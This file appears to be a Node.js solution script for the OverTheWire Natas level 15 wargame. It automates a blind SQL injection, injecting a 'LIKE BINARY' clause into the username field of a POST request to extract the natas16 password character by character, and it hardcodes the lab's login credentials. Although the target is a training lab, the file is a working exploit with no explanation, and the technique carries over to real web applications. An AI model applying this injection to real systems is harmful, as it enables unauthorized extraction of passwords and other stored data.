#!/usr/bin/env node
/* eslint-disable */
fs = require('fs');
http = require('http');

//
chars='ABCEHIJMNOPQRTWabcehijmnopqrtw03569';
password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh';
let n = 0;

function rec(password) {
    console.log(n++)
    for (let i = 0; i < chars.length; i++) {
        doReq(password, chars[i])
    }
}


function doReq(password, char) {
    const postData = 'username=natas16" AND password LIKE BINARY "' + password + char + "%"

    const options = {
        host: 'natas15.natas.labs.overthewire.org',
        path: '/index.php?debug=true',
        method: 'POST',
        auth: "natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J",
        headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(postData)
            }
    };

    const req = http.request(options, (res) => {
    res.setEncoding('utf8');
    res.on('data', (chunk) => {
        if(chunk.match('exists')) {
            password += char;
            console.log('exists', password, char)
            rec(password)
        }
    });
    res.on('end', () => {
        // console.log('fail', password, char)
    });
    });

    req.on('error', (e) => {
        console.error(`problem with request: ${e.message}`);
        process.exit();
    });

    // write data to request body
    req.write(postData);
    req.end();
}

rec(password)